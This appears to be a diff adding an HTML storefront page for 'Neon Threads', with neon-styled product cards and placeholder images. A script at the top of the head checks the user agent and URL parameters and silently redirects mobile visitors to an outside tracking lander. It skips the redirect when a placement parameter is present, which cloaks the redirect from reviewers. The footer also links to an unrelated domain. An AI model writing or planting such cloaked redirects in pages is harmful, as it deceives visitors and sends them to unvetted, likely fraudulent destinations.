@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Neon Threads - Glow in Style</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #000;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #ff00ff;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 0 0 10px #00ffff;
+        }
+        nav {
+            background-color: #00ff00;
+            padding: 10px;
+        }
+        nav a {
+            color: #000;
+            text-decoration: none;
+            padding: 5px 10px;
+            margin: 0 5px;
+            font-weight: bold;
+        }
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            padding: 20px;
+        }
+        .product-card {
+            background-color: #333;
+            border: 2px solid #00ffff;
+            padding: 15px;
+            text-align: center;
+            box-shadow: 0 0 15px #00ffff;
+        }
+        .product-card img {
+            max-width: 100%;
+            height: auto;
+        }
+        footer {
+            background-color: #ff00ff;
+            color: #fff;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Neon Threads</h1>
+        <p>Glow in Style</p>
+    </header>
+    <nav>
+        <a href="#">Home</a>
+        <a href="#">Shop</a>
+        <a href="#">About</a>
+        <a href="#">Contact</a>
+    </nav>
+    <main>
+        <div class="product-grid">
+            <div class="product-card">
+                <img src="https://via.placeholder.com/200x200.png?text=Neon+Jacket" alt="Neon Jacket">
+                <h2>Glow Rider Jacket</h2>
+                <p>$129.99</p>
+                <button>Add to Cart</button>
+            </div>
+            <div class="product-card">
+                <img src="https://via.placeholder.com/200x200.png?text=LED+Shoes" alt="LED Shoes">
+                <h2>Light-Up Kicks</h2>
+                <p>$89.99</p>
+                <button>Add to Cart</button>
+            </div>
+            <div class="product-card">
+                <img src="https://via.placeholder.com/200x200.png?text=Glow+Shirt" alt="Glow Shirt">
+                <h2>Luminous Tee</h2>
+                <p>$49.99</p>
+                <button>Add to Cart</button>
+            </div>
+            <div class="product-card">
+                <img src="https://via.placeholder.com/200x200.png?text=Neon+Accessories" alt="Neon Accessories">
+                <h2>Bright Night Accessories</h2>
+                <p>$29.99</p>
+                <button>Add to Cart</button>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Neon Threads. All rights reserved. | <a href="https://tokreward.com/privacy.html" style="color: #fff;">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
